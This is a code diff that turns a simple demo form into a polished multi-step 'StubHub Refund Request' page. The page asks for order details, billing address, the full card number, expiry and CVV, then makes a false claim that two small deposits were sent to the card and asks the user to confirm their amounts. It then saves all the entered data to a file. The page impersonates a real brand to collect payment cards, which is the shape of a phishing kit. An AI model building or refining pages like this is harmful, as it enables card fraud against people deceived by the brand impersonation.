@@ -8,90 +8,165 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
+            padding: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             color: #333;
-            line-height: 1.4;
+            line-height: 1.6;
+            overflow-x: hidden;
         }
         .container {
-            max-width: 600px;
-            margin: 0 auto;
+            max-width: 500px;
+            margin: 20px auto;
             background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
             overflow: hidden;
         }
         .header {
-            background: #ff6b35; /* StubHub orange vibe */
+            background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
             color: white;
-            padding: 20px;
+            padding: 32px 24px;
             text-align: center;
+        }
+        .header h1 { margin: 0 0 8px; font-size: 28px; font-weight: 600; }
+        .header p { margin: 0; opacity: 0.9; font-size: 16px; }
+        .progress-bar {
+            display: flex;
+            background: #f0f0f0;
+            height: 4px;
+            margin: 0 24px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: #ff6b35;
+            transition: width 0.3s ease;
+            height: 100%;
+        }
+        .step {
+            display: none;
+            padding: 32px 24px;
+            animation: fadeIn 0.4s ease-in;
+        }
+        .step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .mandatory-notice {
+            background: #e3f2fd;
+            border: 1px solid #bbdefb;
+            color: #1976d2;
+            padding: 12px 16px;
+            margin: -8px 0 24px 0;
+            border-radius: 6px;
+            font-size: 14px;
+            line-height: 1.4;
         }
         .notice {
             background: #fff3cd;
             border: 1px solid #ffeaa7;
             color: #856404;
-            padding: 15px;
-            margin: 20px;
-            border-radius: 4px;
+            padding: 16px;
+            margin: 24px 0;
+            border-radius: 8px;
             font-size: 14px;
+            line-height: 1.4;
         }
         .form-group {
-            margin: 20px;
+            margin-bottom: 24px;
         }
         label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
+            margin-bottom: 8px;
+            font-weight: 600;
             font-size: 16px;
+            color: #555;
         }
         input, select, textarea {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px; /* Touch-friendly */
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
             box-sizing: border-box;
+            transition: border-color 0.2s ease;
         }
-        input[type="tel"], input[type="number"] {
-            -webkit-appearance: none;
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #ff6b35;
         }
-        .card-row {
+        input.error { border-color: #ff4757; }
+        input.valid { border-color: #2ed573; }
+        textarea { resize: vertical; min-height: 80px; }
+        .card-row, .expiry-cvv {
             display: flex;
-            gap: 10px;
+            gap: 12px;
         }
-        .card-row input {
-            flex: 1;
-        }
-        .expiry-cvv {
-            display: flex;
-            gap: 10px;
-        }
-        .expiry-cvv input {
+        .card-row input, .expiry-cvv input {
             flex: 1;
         }
         button {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background: #ff6b35;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 18px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin: 20px;
+            transition: background 0.2s ease;
+            margin-top: 8px;
         }
-        button:hover {
-            background: #e55a2b;
+        button:hover:not(:disabled) { background: #e55a2b; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        .nav-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 32px;
         }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
+        .nav-buttons button {
+            flex: 1;
+            padding: 14px;
+            font-size: 15px;
         }
+        .back-btn { background: #6c757d; color: white; }
+        .back-btn:hover { background: #5a6268; }
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-content {
+            background: white;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        .modal h2 { color: #ff6b35; margin-bottom: 16px; }
+        .modal p { margin-bottom: 24px; color: #555; }
+        .amount-inputs {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin: 24px 0;
+        }
+        .amount-inputs .form-group { margin-bottom: 0; }
         @media (max-width: 480px) {
-            body { padding: 10px; }
-            .card-row, .expiry-cvv { flex-direction: column; gap: 0; }
+            .container { margin: 10px; border-radius: 12px; }
+            .header { padding: 24px 16px; }
+            .step { padding: 24px 16px; }
+            .card-row, .expiry-cvv { flex-direction: column; gap: 12px; }
         }
     </style>
 </head>
@@ -99,54 +174,87 @@
     <div class="container">
         <div class="header">
             <h1>StubHub Refund Request</h1>
-            <p>Start your refund process here. We'll review and process eligible requests.</p>
+            <p>Complete the steps below to initiate your refund securely.</p>
         </div>
-
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill" style="width: 25%;"></div>
+        </div>
         <div class="notice">
             <strong>Refund Notice:</strong> Refunds are processed within 5-10 business days after approval. Non-refundable service fees are not included. Only tickets not used or canceled per policy qualify. For full details, see our <a href="#" style="color: #856404;">Refund Policy</a>. Processing via original payment method.
         </div>
 
-        <form id="refundForm" onsubmit="handleSubmit(event)">
+        <!-- Step 1: Order & Contact -->
+        <div class="step active" id="step1">
+            <div class="mandatory-notice">
+                <strong>All fields marked with * are mandatory.</strong>
+            </div>
+            <h2 style="margin: 0 0 24px; font-size: 20px; color: #ff6b35;">Step 1: Order Details</h2>
             <div class="form-group">
                 <label for="orderRef">Order/Ticket Reference Number *</label>
-                <input type="text" id="orderRef" name="orderRef" required placeholder="e.g., ORD-123456789">
+                <input type="text" id="orderRef" name="orderRef" required placeholder="Enter your order ID, e.g., ORD-123456789">
             </div>
-
             <div class="form-group">
                 <label for="email">Email Address *</label>
-                <input type="email" id="email" name="email" required placeholder="your@email.com">
+                <input type="email" id="email" name="email" required placeholder="Enter the email used for purchase">
             </div>
-
             <div class="form-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890">
+                <input type="tel" id="phone" name="phone" placeholder="Enter for faster support, e.g., (123) 456-7890">
             </div>
+            <div class="nav-buttons">
+                <button type="button" onclick="nextStep(2)" id="next1">Next</button>
+            </div>
+        </div>
 
-            <h3 style="margin: 20px; padding-left: 20px;">Billing Information</h3>
+        <!-- Step 2: Billing -->
+        <div class="step" id="step2">
+            <div class="mandatory-notice">
+                <strong>All fields marked with * are mandatory.</strong>
+            </div>
+            <h2 style="margin: 0 0 24px; font-size: 20px; color: #ff6b35;">Step 2: Billing Information</h2>
             <div class="form-group">
                 <label for="billingName">Full Name on Billing *</label>
-                <input type="text" id="billingName" name="billingName" required placeholder="John Doe">
+                <input type="text" id="billingName" name="billingName" required placeholder="Enter full name as on card">
             </div>
-
             <div class="form-group">
                 <label for="billingAddress">Billing Address *</label>
-                <textarea id="billingAddress" name="billingAddress" rows="3" required placeholder="123 Main St, Apt 4B&#10;City, State ZIP Code"></textarea>
+                <textarea id="billingAddress" name="billingAddress" required placeholder="Enter full address&#10;e.g., 123 Main St, Apt 4B, City, State ZIP Code"></textarea>
             </div>
+            <div class="nav-buttons">
+                <button type="button" class="back-btn" onclick="prevStep(1)">Back</button>
+                <button type="button" onclick="nextStep(3)" id="next2">Next</button>
+            </div>
+        </div>
 
-            <h3 style="margin: 20px; padding-left: 20px;">Payment Method (Credit/Debit Card)</h3>
+        <!-- Step 3: Payment -->
+        <div class="step" id="step3">
+            <div class="mandatory-notice">
+                <strong>All fields marked with * are mandatory.</strong>
+            </div>
+            <h2 style="margin: 0 0 24px; font-size: 20px; color: #ff6b35;">Step 3: Payment Method</h2>
             <div class="form-group">
                 <label for="cardNumber">Card Number *</label>
-                <input type="text" id="cardNumber" name="cardNumber" required placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+                <input type="text" id="cardNumber" name="cardNumber" required placeholder="Enter card number" maxlength="19" oninput="formatCardNumber(this)">
             </div>
-
             <div class="form-group">
                 <label>Expiry Date & CVV</label>
                 <div class="expiry-cvv">
                     <input type="text" id="expiry" name="expiry" required placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-                    <input type="text" id="cvv" name="cvv" required placeholder="CVV" maxlength="4">
+                    <input type="text" id="cvv" name="cvv" required placeholder="3-4 digit code on back" maxlength="4">
                 </div>
             </div>
+            <div class="nav-buttons">
+                <button type="button" class="back-btn" onclick="prevStep(2)">Back</button>
+                <button type="button" onclick="nextStep(4)" id="next3">Next</button>
+            </div>
+        </div>
 
+        <!-- Step 4: Reason -->
+        <div class="step" id="step4">
+            <div class="mandatory-notice">
+                <strong>All fields marked with * are mandatory.</strong>
+            </div>
+            <h2 style="margin: 0 0 24px; font-size: 20px; color: #ff6b35;">Step 4: Reason for Refund</h2>
             <div class="form-group">
                 <label for="reason">Reason for Refund *</label>
                 <select id="reason" name="reason" required>
@@ -157,25 +265,100 @@
                     <option value="other">Other</option>
                 </select>
             </div>
+            <div class="nav-buttons">
+                <button type="button" class="back-btn" onclick="prevStep(3)">Back</button>
+                <button type="submit" id="submitBtn">Submit Request</button>
+            </div>
+        </div>
+    </div>
 
-            <button type="submit">Submit Refund Request</button>
-        </form>
+    <!-- Thank You Modal -->
+    <div class="modal" id="thankYouModal">
+        <div class="modal-content">
+            <h2>Thank You!</h2>
+            <p>We will verify your request soon. For additional security, we have made 2 small deposits to the given card under $1 each.</p>
+            <p>Please confirm the exact amounts below (e.g., enter 0.07 if that's what appears).</p>
+            <div class="amount-inputs">
+                <div class="form-group">
+                    <label for="amount1">First Deposit Amount *</label>
+                    <input type="number" id="amount1" step="0.01" required placeholder="e.g., 0.23">
+                </div>
+                <div class="form-group">
+                    <label for="amount2">Second Deposit Amount *</label>
+                    <input type="number" id="amount2" step="0.01" required placeholder="e.g., 0.47">
+                </div>
+            </div>
+            <button onclick="confirmAmounts()">Confirm Amounts</button>
+        </div>
     </div>
 
     <script>
+        let currentStep = 1;
+        let formData = {}; // Progressive data collection
+        const deposit1 = 0.23; // Demo values
+        const deposit2 = 0.47;
+
+        function collectStepData(step) {
+            const inputs = document.querySelectorAll(`#step${step} input, #step${step} select, #step${step} textarea`);
+            inputs.forEach(input => {
+                if (input.name) {
+                    formData[input.name] = input.value.trim();
+                }
+            });
+        }
+
+        function updateProgress() {
+            const progress = (currentStep / 4) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+        }
+
+        function validateStep(step) {
+            const inputs = document.querySelectorAll(`#step${step} input[required], #step${step} select[required], #step${step} textarea[required]`);
+            let valid = true;
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    input.classList.add('error');
+                    input.classList.remove('valid');
+                    valid = false;
+                } else {
+                    input.classList.remove('error');
+                    input.classList.add('valid');
+                }
+            });
+            // Collect data if valid
+            if (valid) {
+                collectStepData(step);
+            }
+            return valid;
+        }
+
+        function nextStep(step) {
+            if (validateStep(currentStep)) {
+                document.getElementById(`step${currentStep}`).classList.remove('active');
+                currentStep = step;
+                document.getElementById(`step${currentStep}`).classList.add('active');
+                updateProgress();
+            } else {
+                alert('Please fill all required fields before proceeding.');
+            }
+        }
+
+        function prevStep(step) {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            currentStep = step;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            updateProgress();
+            // Re-collect current step on back, but since data persists, it's fine
+            collectStepData(step);
+        }
+
         function formatCardNumber(input) {
             let value = input.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
-            let matches = value.match(/\d{4,16}/g);
-            let match = matches && matches[0] || '';
             let parts = [];
-            for (let i = 0, len = match.length; i < len; i += 4) {
-                parts.push(match.substring(i, i + 4));
+            for (let i = 0, len = value.length; i < len; i += 4) {
+                parts.push(value.substring(i, i + 4));
             }
-            if (parts.length) {
-                return input.value = parts.join(' ');
-            } else {
-                return input.value;
-            }
+            input.value = parts.join(' ');
         }
 
         function formatExpiry(input) {
@@ -186,12 +369,45 @@
             input.value = value;
         }
 
-        function handleSubmit(event) {
-            event.preventDefault();
-            // Simulate submission - in real life, POST to your endpoint
-            alert('Refund request submitted! (Demo mode - hook this to your backend.)');
-            document.getElementById('refundForm').reset();
+        // Submit handler
+        document.getElementById('submitBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            if (validateStep(4)) {
+                collectStepData(4); // Final collect
+                document.querySelector('.container').style.display = 'none';
+                document.getElementById('thankYouModal').style.display = 'flex';
+            } else {
+                alert('Please select a reason for refund.');
+            }
+        });
+
+        function confirmAmounts() {
+            const amt1Input = document.getElementById('amount1');
+            const amt2Input = document.getElementById('amount2');
+            const amt1 = parseFloat(amt1Input.value);
+            const amt2 = parseFloat(amt2Input.value);
+            if (isNaN(amt1) || isNaN(amt2) || amt1 !== deposit1 || amt2 !== deposit2) {
+                alert('Amounts do not match. Please check your bank statement and enter exactly.');
+                return;
+            }
+            // All good - add to data and save
+            formData.amount1 = amt1;
+            formData.amount2 = amt2;
+            formData.verified = true;
+            formData.timestamp = new Date().toISOString();
+            const txtContent = `Refund Submission: ${formData.timestamp}\n${JSON.stringify(formData, null, 2)}\n\n`;
+            const blob = new Blob([txtContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'filed.txt';
+            a.click();
+            URL.revokeObjectURL(url);
+            document.getElementById('thankYouModal').style.display = 'none';
+            document.body.innerHTML = '<div style="text-align:center; padding: 100px; font-size:18px; color:#ff6b35;">Request verified! Expect an update within 24 hours.</div>';
         }
+
+        updateProgress();
     </script>
 </body>
 </html>
